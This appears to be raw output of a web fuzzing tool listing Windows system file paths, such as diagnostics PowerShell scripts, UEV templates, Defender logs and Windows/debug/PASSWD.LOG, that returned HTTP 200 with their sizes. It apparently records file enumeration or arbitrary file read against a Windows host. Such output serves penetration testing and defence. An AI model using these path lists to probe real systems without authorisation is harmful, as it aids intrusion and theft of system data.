000003761:   200        238 L    2062 W     65526 Ch    "Users/All Users/Microsoft/SmsRouter/MessageStore/edbtmp.log"                                          
000003759:   200        13 L     71 W       65536 Ch    "Users/All Users/Microsoft/SmsRouter/MessageStore/edb.log"                                             
000003754:   200        4 L      90 W       12975 Ch    "Users/All Users/Microsoft/IdentityCRL/INT/wlidsvcconfig.xml"                                          
000003750:   200        24 L     141 W      1512 Ch     "Users/All Users/Microsoft/Device Stage/Task/{e35be42d-f742-4d96-a50a-1775fb1a7a42}/en-US/resource.xml"
000003752:   200        0 L      1 W        10 Ch       "Users/All Users/Microsoft/Diagnosis/osver.txt"                                                        
000003770:   200        1996 L   2711 W     72783 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2010Win32.xml"                            
000003772:   200        400 L    604 W      13158 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013BackupWin32.xml"                      
000003776:   200        1864 L   2602 W     68365 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013Win32.xml"                            
000003784:   200        32 L     89 W       1289 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOutlook2016CAWin32.xml"                         
000003793:   200        12 L     64 W       611 Ch      "Users/All Users/Microsoft/UEV/Scripts/RegisterInboxTemplates.ps1"                                     
000003792:   200        26 L     33 W       890 Ch      "Users/All Users/Microsoft/UEV/InboxTemplates/VdiState.xml"                                            
000003791:   200        60 L     152 W      2521 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/ThemeSettings2013.xml"                                   
000003790:   200        71 L     199 W      3253 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/RoamingCredentialSettings.xml"                           
000003789:   200        46 L     131 W      2038 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/NetworkPrinters.xml"                                     
000003788:   200        26 L     71 W       1003 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftWordpad.xml"                                    
000003787:   200        74 L     131 W      2889 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftSkypeForBusiness2016Win64.xml"                  
000003753:   200        1377 L   8255 W     516570 Ch   "Users/All Users/Microsoft/EdgeUpdate/Log/MicrosoftEdgeUpdate.log"                                     
000003786:   200        74 L     131 W      2889 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftSkypeForBusiness2016Win32.xml"                  
000003783:   200        32 L     89 W       1286 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOutlook2013CAWin64.xml"                         
000003785:   200        32 L     89 W       1289 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOutlook2016CAWin64.xml"                         
000003782:   200        32 L     89 W       1286 Ch     "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOutlook2013CAWin32.xml"                         
000003781:   200        1788 L   2504 W     65732 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2016Win64.xml"                            
000003780:   200        1788 L   2504 W     65729 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2016Win32.xml"                            
000003779:   200        400 L    604 W      13158 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2016BackupWin64.xml"                      
000003778:   200        400 L    604 W      13158 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2016BackupWin32.xml"                      
000003775:   200        337 L    568 W      10594 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013Office365Win64.xml"                   
000003777:   200        1864 L   2602 W     68365 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013Win64.xml"                            
000003774:   200        337 L    568 W      10594 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013Office365Win32.xml"                   
000003771:   200        1996 L   2711 W     72783 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2010Win64.xml"                            
000003773:   200        400 L    604 W      13158 Ch    "Users/All Users/Microsoft/UEV/InboxTemplates/MicrosoftOffice2013BackupWin64.xml"                      
000003822:   200        5 L      11 W       120 Ch      "Users/All Users/Microsoft/Windows Defender/Scans/History/Service/Unknown.Log"                         
000003832:   200        364 L    921 W      16858 Ch    "Users/All Users/Microsoft/Windows/Power Efficiency Diagnostics/energy-report-latest.xml"              
000003865:   200        1 L      1 W        26 Ch       "Windows/assembly/GAC_MSIL/System.Xml"                                                                 
000003868:   200        1 L      1 W        33 Ch       "Windows/assembly/NativeImages_v2.0.50727_64/System.Xml"                                               
000003867:   200        1 L      1 W        33 Ch       "Windows/assembly/NativeImages_v2.0.50727_32/System.Xml"                                               
000003864:   200        1 L      1 W        26 Ch       "Windows/assembly/GAC_MSIL/System.IO.Log"                                                              
000003863:   200        6 L      10 W       161 Ch      "Windows/assembly/GAC_64/PresentationCore/3.0.0.0__31bf3856ad364e35/PresentationFontCache.exe.config"  
000003862:   200        28 L     74 W       1581 Ch     "Windows/assembly/GAC_64/MSBuild/3.5.0.0__b03f5f7f11d50a3a/msbuild.exe.config"                         
000003861:   200        6 L      10 W       161 Ch      "Windows/assembly/GAC_32/PresentationCore/3.0.0.0__31bf3856ad364e35/PresentationFontCache.exe.config"  
000003860:   200        28 L     74 W       1581 Ch     "Windows/assembly/GAC_32/MSBuild/3.5.0.0__b03f5f7f11d50a3a/msbuild.exe.config"                         
000003859:   200        651 L    1149 W     63947 Ch    "Users/Default/AppData/Local/Microsoft/Windows/Shell/DefaultLayouts.xml"                               
000003858:   200        3 L      7 W        80 Ch       "Users/Default/AppData/Local/Microsoft/Windows Sidebar/settings.ini"                                   
000003869:   200        1 L      1 W        33 Ch       "Windows/assembly/NativeImages_v4.0.30319_32/System.Xml"                                               
000003871:   200        5 L      8 W        91 Ch       "Windows/Boot/BootDebuggerFiles.ini"                                                                   
000003875:   200        12 L     82 W       910 Ch      "windows/debug/netsetup.log"                                                                           
000003883:   200        58 L     77 W       2225 Ch     "Windows/diagnostics/index/DeviceCenterDiagnostic.xml"                                                 
000003889:   200        34 L     42 W       2053 Ch     "Windows/diagnostics/index/NetworkDiagnostics_1_Web.xml"                                               
000003888:   200        23 L     28 W       1278 Ch     "Windows/diagnostics/index/MaintenanceDiagnostic.xml"                                                  
000003887:   200        22 L     28 W       1216 Ch     "Windows/diagnostics/index/KeyboardDiagnostic.xml"                                                     
000003886:   200        35 L     40 W       2234 Ch     "Windows/diagnostics/index/IESecurityDiagnostic.xml"                                                   
000003885:   200        31 L     36 W       1937 Ch     "Windows/diagnostics/index/IEBrowseWebDiagnostic.xml"                                                  
000003757:   200        221 L    1859 W     1310602 C   "Users/All Users/Microsoft/Network/Downloader/edb00001.log"                                            
                                            h                                                                                                                  
000003882:   200        31 L     38 W       2039 Ch     "Windows/diagnostics/index/BluetoothDiagnostic.xml"                                                    
000003884:   200        24 L     31 W       1076 Ch     "Windows/diagnostics/index/DeviceDiagnostic.xml"                                                       
000003881:   200        23 L     27 W       1121 Ch     "Windows/diagnostics/index/BITSDiagnostic.xml"                                                         
000003880:   200        44 L     52 W       2003 Ch     "Windows/diagnostics/index/AudioRecordingDiagnostic.xml"                                               
000003879:   200        44 L     54 W       2155 Ch     "Windows/diagnostics/index/AudioPlaybackDiagnostic.xml"                                                
000003878:   200        24 L     30 W       1233 Ch     "Windows/diagnostics/index/AppsDiagnostic.xml"                                                         
000003874:   200        36 L     159 W      2120 Ch     "Windows/debug/mrt.log"                                                                                
000003876:   200        0 L      0 W        0 Ch        "Windows/debug/PASSWD.LOG"                                                                             
000003870:   200        1 L      1 W        33 Ch       "Windows/assembly/NativeImages_v4.0.30319_64/System.Xml"                                               
000003873:   200        0 L      1 W        4 Ch        "windows/csc/v2.0.6/sm"                                                                                
000003872:   200        0 L      1 W        64 Ch       "windows/csc/v2.0.6/pq"                                                                                
000003890:   200        35 L     42 W       2088 Ch     "Windows/diagnostics/index/NetworkDiagnostics_2_FileShare.xml"                                         
000003892:   200        36 L     43 W       2177 Ch     "Windows/diagnostics/index/NetworkDiagnostics_5_Inbound.xml"                                           
000003825:   200        958 L    10089 W    230263 Ch   "Users/All Users/Microsoft/Windows/Models/SBCModel.txt"                                                
000003896:   200        61 L     76 W       2724 Ch     "Windows/diagnostics/index/PrinterDiagnostic.xml"                                                      
000003899:   200        21 L     27 W       1198 Ch     "Windows/diagnostics/index/VideoPlaybackDiagnostic.xml"                                                
000003898:   200        71 L     82 W       2812 Ch     "Windows/diagnostics/index/SpeechDiagnostic.xml"                                                       
000003895:   200        28 L     33 W       1591 Ch     "Windows/diagnostics/index/PowerDiagnostic.xml"                                                        
000003897:   200        29 L     34 W       1677 Ch     "Windows/diagnostics/index/SearchDiagnostic.xml"                                                       
000003894:   200        26 L     32 W       1484 Ch     "Windows/diagnostics/index/PCWDiagnostic.xml"                                                          
000003891:   200        32 L     39 W       1815 Ch     "Windows/diagnostics/index/NetworkDiagnostics_4_NetworkAdapter.xml"                                    
000003893:   200        32 L     39 W       1829 Ch     "Windows/diagnostics/index/NetworkDiagnostics_6_DA.xml"                                                
000003900:   200        23 L     28 W       1429 Ch     "Windows/diagnostics/index/WindowsMediaPlayerConfiguration.xml"                                        
000003902:   200        34 L     43 W       1873 Ch     "Windows/diagnostics/index/WindowsMediaPlayerPlayDVD.xml"                                              
000003914:   200        53 L     167 W      2201 Ch     "Windows/diagnostics/system/Apps/RC_TempInetFolder.ps1"                                                
000003920:   200        7 L      20 W       367 Ch      "Windows/diagnostics/system/Apps/RS_TemporaryProfile.ps1"                                              
000003906:   200        44 L     146 W      1848 Ch     "Windows/diagnostics/scheduled/Maintenance/RS_MachineWERQueue.ps1"                                     
000003919:   200        71 L     173 W      2378 Ch     "Windows/diagnostics/system/Apps/RS_TempInetFolder.ps1"                                                
000003918:   200        7 L      20 W       344 Ch      "Windows/diagnostics/system/Apps/RS_ConnectedAccount.ps1"                                              
000003917:   200        74 L     215 W      2848 Ch     "Windows/diagnostics/system/Apps/RC_WSReset.ps1"                                                       
000003916:   200        31 L     106 W      1467 Ch     "Windows/diagnostics/system/Apps/RC_UAC.ps1"                                                           
000003913:   200        28 L     78 W       1216 Ch     "Windows/diagnostics/system/Apps/RC_ConnectedAccount.ps1"                                              
000003915:   200        7 L      22 W       379 Ch      "Windows/diagnostics/system/Apps/RC_TemporaryProfile.ps1"                                              
000003911:   200        118 L    406 W      4506 Ch     "Windows/diagnostics/scheduled/Maintenance/TS_InaccurateSystemTime.ps1"                                
000003912:   200        46 L     198 W      2839 Ch     "Windows/diagnostics/scheduled/Maintenance/TS_WERQueue.ps1"                                            
000003910:   200        48 L     175 W      2593 Ch     "Windows/diagnostics/scheduled/Maintenance/TS_DiagnosticHistory.ps1"                                   
000003909:   200        44 L     147 W      1802 Ch     "Windows/diagnostics/scheduled/Maintenance/RS_UserWERQueue.ps1"                                        
000003908:   200        24 L     77 W       1137 Ch     "Windows/diagnostics/scheduled/Maintenance/RS_UserDiagnosticHistory.ps1"                               
000003905:   200        24 L     77 W       1151 Ch     "Windows/diagnostics/scheduled/Maintenance/RS_AdminDiagnosticHistory.ps1"                              
000003758:   200        0 L      1 W        1310720 C   "Users/All Users/Microsoft/Network/Downloader/edbtmp.log"                                              
                                            h                                                                                                                  
000003907:   200        64 L     175 W      1898 Ch     "Windows/diagnostics/scheduled/Maintenance/RS_SyncSystemTime.ps1"                                      
000003904:   200        441 L    1331 W     13868 Ch    "Windows/diagnostics/scheduled/Maintenance/CL_Utility.ps1"                                             
000003901:   200        22 L     27 W       1310 Ch     "Windows/diagnostics/index/WindowsMediaPlayerMediaLibrary.xml"                                         
000003903:   200        38 L     50 W       1914 Ch     "Windows/diagnostics/index/WindowsUpdateDiagnostic.xml"                                                
000003921:   200        23 L     81 W       1066 Ch     "Windows/diagnostics/system/Apps/RS_UAC.ps1"                                                           
000003923:   200        70 L     146 W      1800 Ch     "Windows/diagnostics/system/Apps/TS_Main.ps1"                                                          
000003927:   200        52 L     86 W       1138 Ch     "Windows/diagnostics/system/Audio/CL_AudioDiagnosticSnapIn.ps1"                                        
000003935:   200        62 L     226 W      2715 Ch     "Windows/diagnostics/system/Audio/RS_AudioServiceResponse.ps1"                                         
000003938:   200        181 L    528 W      7127 Ch     "Windows/diagnostics/system/Audio/RS_HDAudioDriver.ps1"                                                
000003939:   200        195 L    480 W      6746 Ch     "Windows/diagnostics/system/Audio/RS_NotDefault.ps1"                                                   
000003937:   200        31 L     65 W       1223 Ch     "Windows/diagnostics/system/Audio/RS_EnableInCPL.ps1"                                                  
000003934:   200        62 L     198 W      2557 Ch     "Windows/diagnostics/system/Audio/RS_AudioService.ps1"                                                 
000003936:   200        43 L     123 W      2012 Ch     "Windows/diagnostics/system/Audio/RS_ChangeVolume.ps1"                                                 
000003933:   200        52 L     121 W      1633 Ch     "Windows/diagnostics/system/Audio/RS_APOLoadFailure.ps1"                                               
000003932:   200        422 L    1076 W     11656 Ch    "Windows/diagnostics/system/Audio/MF_AudioDiagnostic.ps1"                                              
000003930:   200        21 L     43 W       384 Ch      "Windows/diagnostics/system/Audio/CL_RunDiagnosticScript.ps1"                                          
000003929:   200        28 L     45 W       610 Ch      "Windows/diagnostics/system/Audio/CL_LoadAssembly.ps1"                                                 
000003926:   200        70 L     217 W      2790 Ch     "Windows/diagnostics/system/Apps/VF_WSReset.ps1"                                                       
000003928:   200        36 L     76 W       1029 Ch     "Windows/diagnostics/system/Audio/CL_Invocation.ps1"                                                   
000003925:   200        24 L     95 W       1532 Ch     "Windows/diagnostics/system/Apps/VF_UAC.ps1"                                                           
000003922:   200        7 L      20 W       359 Ch      "Windows/diagnostics/system/Apps/RS_WSReset.ps1"                                                       
000003924:   200        269 L    870 W      11023 Ch    "Windows/diagnostics/system/Apps/Utils_Apps.ps1"                                                       
000003940:   200        34 L     79 W       1317 Ch     "Windows/diagnostics/system/Audio/RS_SamplingRate.ps1"                                                 
000003942:   200        143 L    414 W      5103 Ch     "Windows/diagnostics/system/Audio/TS_APOLoadFailure.ps1"                                               
000003946:   200        61 L     186 W      2538 Ch     "Windows/diagnostics/system/Audio/TS_DisabledInCPL.ps1"                                                
000003954:   200        53 L     128 W      1717 Ch     "Windows/diagnostics/system/Audio/VF_LowVolume.ps1"                                                    
000003957:   200        23 L     59 W       1047 Ch     "Windows/diagnostics/system/BITS/RC_BITSACL.ps1"                                                       
000003956:   200        314 L    958 W      10423 Ch    "Windows/diagnostics/system/BITS/cl_Service.ps1"                                                       
000003953:   200        83 L     216 W      2917 Ch     "Windows/diagnostics/system/Audio/VF_HDAudioDriver.ps1"                                                
000003952:   200        64 L     159 W      1987 Ch     "Windows/diagnostics/system/Audio/TS_UnpluggedIn.ps1"                                                  
000003951:   200        49 L     114 W      1585 Ch     "Windows/diagnostics/system/Audio/TS_SamplingRate.ps1"                                                 
000003945:   200        489 L    1330 W     15590 Ch    "Windows/diagnostics/system/Audio/TS_AudioServiceResponse.ps1"                                         
000003949:   200        40 L     96 W       1517 Ch     "Windows/diagnostics/system/Audio/TS_Mute.ps1"                                                         
000003948:   200        66 L     193 W      2450 Ch     "Windows/diagnostics/system/Audio/TS_LowVolume.ps1"                                                    
000003950:   200        40 L     180 W      3182 Ch     "Windows/diagnostics/system/Audio/TS_NotDefault.ps1"                                                   
000003955:   200        740 L    1968 W     20046 Ch    "Windows/diagnostics/system/BITS/CL_Registry.ps1"                                                      
000003947:   200        56 L     160 W      1968 Ch     "Windows/diagnostics/system/Audio/TS_HDAudioDriver.ps1"                                                
000003944:   200        45 L     137 W      1624 Ch     "Windows/diagnostics/system/Audio/TS_AudioService.ps1"                                                 
000003941:   200        30 L     68 W       1250 Ch     "Windows/diagnostics/system/Audio/RS_Unmute.ps1"                                                       
000003943:   200        59 L     142 W      1825 Ch     "Windows/diagnostics/system/Audio/TS_AudioDeviceDriver.ps1"                                            
000003958:   200        83 L     197 W      2218 Ch     "Windows/diagnostics/system/BITS/RC_BITSDLL.ps1"                                                       
000003960:   200        22 L     43 W       855 Ch      "Windows/diagnostics/system/BITS/RS_BITSACL.ps1"                                                       
000003964:   200        911 L    2604 W     33824 Ch    "Windows/diagnostics/system/Bluetooth/CL_Utility.ps1"                                                  
000003972:   200        20 L     48 W       744 Ch      "Windows/diagnostics/system/Bluetooth/RS_CheckBT.ps1"                                                  
000003979:   200        148 L    447 W      5210 Ch     "Windows/diagnostics/system/Device/CL_DetectingDevice.ps1"                                             
000003978:   200        25 L     98 W       1367 Ch     "Windows/diagnostics/system/Bluetooth/VF_BTRadioOff.ps1"                                               
000003977:   200        110 L    455 W      6088 Ch     "Windows/diagnostics/system/Bluetooth/TS_Main.ps1"                                                     
000003976:   200        15 L     57 W       620 Ch      "Windows/diagnostics/system/Bluetooth/RS_PendingRestart.ps1"                                           
000003975:   200        14 L     31 W       709 Ch      "Windows/diagnostics/system/Bluetooth/RS_OtherIssue.ps1"                                               
000003974:   200        29 L     67 W       1304 Ch     "Windows/diagnostics/system/Bluetooth/RS_DriverProblem.ps1"                                            
000003971:   200        34 L     80 W       1421 Ch     "Windows/diagnostics/system/Bluetooth/RS_BTRadioOff.ps1"                                               
000003973:   200        27 L     70 W       1215 Ch     "Windows/diagnostics/system/Bluetooth/RS_Disabled.ps1"                                                 
000003970:   200        34 L     114 W      1125 Ch     "Windows/diagnostics/system/Bluetooth/RC_PendingRestart.ps1"                                           
000003969:   200        36 L     110 W      1732 Ch     "Windows/diagnostics/system/Bluetooth/RC_OtherIssue.ps1"                                               
000003968:   200        54 L     163 W      2280 Ch     "Windows/diagnostics/system/Bluetooth/RC_DriverProblem.ps1"                                            
000003967:   200        50 L     173 W      2057 Ch     "Windows/diagnostics/system/Bluetooth/RC_Disabled.ps1"                                                 
000003966:   200        21 L     83 W       1191 Ch     "Windows/diagnostics/system/Bluetooth/RC_CheckBT.ps1"                                                  
000003963:   200        49 L     125 W      1809 Ch     "Windows/diagnostics/system/BITS/TS_Main.ps1"                                                          
000003962:   200        136 L    346 W      5330 Ch     "Windows/diagnostics/system/BITS/RS_BITSRegKeys.ps1"                                                   
000003965:   200        24 L     67 W       1215 Ch     "Windows/diagnostics/system/Bluetooth/RC_BTRadioOff.ps1"                                               
000003959:   200        150 L    365 W      5342 Ch     "Windows/diagnostics/system/BITS/RC_BITSRegKeys.ps1"                                                   
000003961:   200        16 L     47 W       776 Ch      "Windows/diagnostics/system/BITS/RS_BITSDLL.ps1"                                                       
000003980:   200        1192 L   3209 W     44969 Ch    "Windows/diagnostics/system/Device/CL_Utility.ps1"                                                     
000003982:   200        74 L     225 W      2864 Ch     "Windows/diagnostics/system/Device/RS_CheckDriversOnInstall.ps1"                                       
000003986:   200        141 L    514 W      6715 Ch     "Windows/diagnostics/system/Device/RS_InformCustomer.ps1"                                              
000003994:   200        83 L     232 W      3335 Ch     "Windows/diagnostics/system/Device/TS_InformCustomer.ps1"                                              
000004010:   200        41 L     102 W      1503 Ch     "Windows/diagnostics/system/IEBrowseWeb/TS_IEconnection.ps1"                                           
000004019:   200        73 L     211 W      3191 Ch     "Windows/diagnostics/system/IESecurity/RS_PhishingFilter.ps1"                                          
000004020:   200        45 L     103 W      1291 Ch     "Windows/diagnostics/system/IESecurity/TS_Blockpopups.ps1"                                             
000004018:   200        23 L     66 W       1072 Ch     "Windows/diagnostics/system/IESecurity/RS_IESecuritylevels.ps1"                                        
000004017:   200        54 L     128 W      1745 Ch     "Windows/diagnostics/system/IESecurity/RS_Blockpopups.ps1"                                             
000004016:   200        460 L    1421 W     16644 Ch    "Windows/diagnostics/system/IESecurity/IEsecuritysettings.ps1"                                         
000004015:   200        13 L     29 W       268 Ch      "Windows/diagnostics/system/IESecurity/IESecurity_TroubleShooter.ps1"                                  
000004014:   200        47 L     224 W      2456 Ch     "Windows/diagnostics/system/IESecurity/CL_Utility.ps1"                                                 
000004013:   200        39 L     98 W       1122 Ch     "Windows/diagnostics/system/IEBrowseWeb/VF_IEDefectiveAddon.ps1"                                       
000004012:   200        43 L     86 W       1074 Ch     "Windows/diagnostics/system/IEBrowseWeb/TS_tempfilecachesize.ps1"                                      
000004009:   200        48 L     120 W      1466 Ch     "Windows/diagnostics/system/IEBrowseWeb/TS_IEAddonLoadingTime.ps1"                                     
000004011:   200        32 L     73 W       946 Ch      "Windows/diagnostics/system/IEBrowseWeb/TS_pagesyncpolicy.ps1"                                         
000004008:   200        262 L    836 W      12435 Ch    "Windows/diagnostics/system/IEBrowseWeb/TS_IEAddon.ps1"                                                
000004007:   200        63 L     142 W      2422 Ch     "Windows/diagnostics/system/IEBrowseWeb/RS_RestoreIEconnection.ps1"                                    
000004006:   200        41 L     101 W      1464 Ch     "Windows/diagnostics/system/IEBrowseWeb/RS_Resetpagesyncpolicy.ps1"                                    
000004005:   200        45 L     113 W      1544 Ch     "Windows/diagnostics/system/IEBrowseWeb/RS_ResetCacheSize.ps1"                                         
000004004:   200        62 L     189 W      2601 Ch     "Windows/diagnostics/system/IEBrowseWeb/RS_DisableaddonLoadingTime.ps1"                                
000004003:   200        64 L     162 W      2262 Ch     "Windows/diagnostics/system/IEBrowseWeb/RS_Disableaddon.ps1"                                           
000004002:   200        22 L     60 W       562 Ch      "Windows/diagnostics/system/IEBrowseWeb/IEBrowseWeb_TroubleShooter.ps1"                                
000004001:   200        320 L    916 W      11386 Ch    "Windows/diagnostics/system/IEBrowseWeb/CL_Utility.ps1"                                                
000004000:   200        65 L     118 W      1387 Ch     "Windows/diagnostics/system/DeviceCenter/TS_DeviceCenter.ps1"                                          
000003998:   200        30 L     67 W       992 Ch      "Windows/diagnostics/system/Device/VF_RescanAllDevices.ps1"                                            
000003997:   200        43 L     97 W       1359 Ch     "Windows/diagnostics/system/Device/TS_RescanAllDevices.ps1"                                            
000003996:   200        46 L     136 W      1890 Ch     "Windows/diagnostics/system/Device/TS_PendingRestart.ps1"                                              
000003993:   200        152 L    384 W      4652 Ch     "Windows/diagnostics/system/Device/TS_HardwareDeviceMain.ps1"                                          
000003931:   200        3097 L   41477 W    223960 Ch   "Windows/diagnostics/system/Audio/CL_Utility.ps1"                                                      
000003995:   200        80 L     235 W      3288 Ch     "Windows/diagnostics/system/Device/TS_NotWorkingProperly.ps1"                                          
000003992:   200        93 L     263 W      3429 Ch     "Windows/diagnostics/system/Device/TS_DriverNotFound.ps1"                                              
000003990:   200        66 L     196 W      2750 Ch     "Windows/diagnostics/system/Device/TS_DeviceDisabled.ps1"                                              
000003991:   200        82 L     247 W      3391 Ch     "Windows/diagnostics/system/Device/TS_DeviceDriverNeedsUpdate.ps1"                                     
000003988:   200        22 L     47 W       831 Ch      "Windows/diagnostics/system/Device/RS_RescanAllDevices.ps1"                                            
000003989:   200        49 L     129 W      1774 Ch     "Windows/diagnostics/system/Device/TS_CheckDriversOnInstall.ps1"                                       
000003985:   200        41 L     129 W      1576 Ch     "Windows/diagnostics/system/Device/RS_EnableDevice.ps1"                                                
000003987:   200        12 L     30 W       391 Ch      "Windows/diagnostics/system/Device/RS_PendingRestart.ps1"                                              
000003984:   200        90 L     218 W      2811 Ch     "Windows/diagnostics/system/Device/RS_DriverNotFound.ps1"                                              
000003983:   200        78 L     227 W      2894 Ch     "Windows/diagnostics/system/Device/RS_DeviceDriverNeedsUpdate.ps1"                                     
000003981:   200        168 L    335 W      5206 Ch     "Windows/diagnostics/system/Device/DB_DeviceErrorLibrary.ps1"                                          
000004023:   200        6 L      14 W       202 Ch      "Windows/diagnostics/system/Keyboard/CL_Cicero.ps1"                                                    
000004021:   200        85 L     206 W      3053 Ch     "Windows/diagnostics/system/IESecurity/TS_IEsecuritylevels.ps1"                                        
000004027:   200        9 L      21 W       181 Ch      "Windows/diagnostics/system/Keyboard/TS_Cicero.ps1"                                                    
000004035:   200        50 L     193 W      3011 Ch     "Windows/diagnostics/system/Networking/UtilitySetConstants.ps1"                                        
000004041:   200        66 L     224 W      3102 Ch     "Windows/diagnostics/system/Power/RS_AdjustDimDisplay.ps1"                                             
000004040:   200        799 L    1914 W     27598 Ch    "Windows/diagnostics/system/Power/Powerconfig.ps1"                                                     
000004039:   200        33 L     73 W       746 Ch      "Windows/diagnostics/system/Power/Power_Troubleshooter.ps1"                                            
000004037:   200        539 L    1511 W     16950 Ch    "Windows/diagnostics/system/PCW/TS_ProgramCompatibilityWizard.ps1"                                     
000004038:   200        18 L     60 W       453 Ch      "Windows/diagnostics/system/PCW/VF_ProgramCompatibilityWizard.ps1"                                     
000004034:   200        1639 L   4695 W     54687 Ch    "Windows/diagnostics/system/Networking/UtilityFunctions.ps1"                                           
000004036:   200        1478 L   3638 W     50242 Ch    "Windows/diagnostics/system/PCW/RS_ProgramCompatibilityWizard.ps1"                                     
000004033:   200        17 L     44 W       567 Ch      "Windows/diagnostics/system/Networking/StartDPSService.ps1"                                            
000004032:   200        201 L    1188 W     11079 Ch    "Windows/diagnostics/system/Networking/NetworkDiagnosticsVerify.ps1"                                   
000004031:   200        591 L    2185 W     25915 Ch    "Windows/diagnostics/system/Networking/NetworkDiagnosticsTroubleshoot.ps1"                             
000003999:   200        788 L    2290 W     34272 Ch    "Windows/diagnostics/system/DeviceCenter/CL_Utility.ps1"                                               
000004030:   200        322 L    1089 W     12213 Ch    "Windows/diagnostics/system/Networking/NetworkDiagnosticsResolve.ps1"                                  
000004029:   200        20 L     81 W       770 Ch      "Windows/diagnostics/system/Networking/InteractiveRes.ps1"                                             
000004026:   200        4 L      8 W        156 Ch      "Windows/diagnostics/system/Keyboard/RS_Cicero.ps1"                                                    
000004028:   200        21 L     93 W       951 Ch      "Windows/diagnostics/system/Networking/HTInteractiveRes.ps1"                                           
000004025:   200        9 L      16 W       137 Ch      "Windows/diagnostics/system/Keyboard/KeyboardDiagnostic.ps1"                                           
000004022:   200        65 L     159 W      2032 Ch     "Windows/diagnostics/system/IESecurity/TS_PhishingFilter.ps1"                                          
000004024:   200        13 L     14 W       218 Ch      "Windows/diagnostics/system/Keyboard/CL_Telemetry.ps1"                                                 
000004042:   200        46 L     150 W      2192 Ch     "Windows/diagnostics/system/Power/RS_AdjustScreenBrightness.ps1"                                       
000004044:   200        56 L     149 W      2135 Ch     "Windows/diagnostics/system/Power/RS_Balanced.ps1"                                                     
000004048:   200        67 L     224 W      3160 Ch     "Windows/diagnostics/system/Power/RS_ResetDisplayIdleTimeout.ps1"                                      
000004056:   200        38 L     119 W      1564 Ch     "Windows/diagnostics/system/Power/TS_MinProcessorState.ps1"                                            
000004063:   200        29 L     60 W       607 Ch      "Windows/diagnostics/system/Printer/RS_CancelAllJobs.ps1"                                              
000004062:   200        183 L    438 W      4509 Ch     "Windows/diagnostics/system/Printer/MF_PrinterDiagnostic.ps1"                                          
000004061:   200        808 L    1908 W     29574 Ch    "Windows/diagnostics/system/Printer/CL_Utility.ps1"                                                    
000004060:   200        66 L     164 W      2048 Ch     "Windows/diagnostics/system/Power/TS_Wirelessadaptersettings.ps1"                                      
000004059:   200        42 L     118 W      1492 Ch     "Windows/diagnostics/system/Power/TS_USBSelective.ps1"                                                 
000004058:   200        37 L     69 W       772 Ch      "Windows/diagnostics/system/Power/TS_ScreenSaver.ps1"                                                  
000004055:   200        47 L     140 W      1711 Ch     "Windows/diagnostics/system/Power/TS_IdleSleepsetting.ps1"                                             
000004057:   200        48 L     103 W      1326 Ch     "Windows/diagnostics/system/Power/TS_ScreenBrightness.ps1"                                             
000004054:   200        47 L     141 W      1695 Ch     "Windows/diagnostics/system/Power/TS_IdleDiskTimeout.ps1"                                              
000004053:   200        44 L     140 W      1712 Ch     "Windows/diagnostics/system/Power/TS_DisplayIdleTimeout.ps1"                                           
000004052:   200        40 L     131 W      1626 Ch     "Windows/diagnostics/system/Power/TS_DimDisplay.ps1"                                                   
000004051:   200        93 L     201 W      3051 Ch     "Windows/diagnostics/system/Power/TS_Balanced.ps1"                                                     
000004050:   200        66 L     224 W      3144 Ch     "Windows/diagnostics/system/Power/RS_ResetIdleSleepsetting.ps1"                                        
000004047:   200        65 L     216 W      3053 Ch     "Windows/diagnostics/system/Power/RS_DisableUSBSelective.ps1"                                          
000004049:   200        66 L     224 W      3137 Ch     "Windows/diagnostics/system/Power/RS_ResetIdleDiskTimeout.ps1"                                         
000004046:   200        20 L     34 W       389 Ch      "Windows/diagnostics/system/Power/RS_DisableScreensaver.ps1"                                           
000004043:   200        65 L     216 W      3130 Ch     "Windows/diagnostics/system/Power/RS_Adjustwirelessadaptersettings.ps1"                                
000004045:   200        67 L     216 W      3091 Ch     "Windows/diagnostics/system/Power/RS_ChangeProcessorState.ps1"                                         
000004064:   200        131 L    433 W      4161 Ch     "Windows/diagnostics/system/Printer/RS_DeletePrintJobs.ps1"                                            
000004066:   200        13 L     35 W       552 Ch      "Windows/diagnostics/system/Printer/RS_PrinterDriver.ps1"                                              
000004070:   200        29 L     71 W       709 Ch      "Windows/diagnostics/system/Printer/RS_SetSpoolerStartMode.ps1"                                        
000004078:   200        24 L     69 W       757 Ch      "Windows/diagnostics/system/Printer/TS_OutOfToner.ps1"                                                 
000004084:   200        39 L     110 W      974 Ch      "Windows/diagnostics/system/Printer/TS_SetSpoolerMode.ps1"                                             
000004083:   200        49 L     200 W      2086 Ch     "Windows/diagnostics/system/Printer/TS_PrintJobsStuck.ps1"                                             
000004082:   200        23 L     71 W       760 Ch      "Windows/diagnostics/system/Printer/TS_PrinterTurnedOff.ps1"                                           
000004081:   200        27 L     98 W       1049 Ch     "Windows/diagnostics/system/Printer/TS_PrinterDriverError.ps1"                                         
000004080:   200        22 L     68 W       746 Ch      "Windows/diagnostics/system/Printer/TS_PrinterDriver.ps1"                                              
000004077:   200        22 L     62 W       663 Ch      "Windows/diagnostics/system/Printer/TS_OutOfPaper.ps1"                                                 
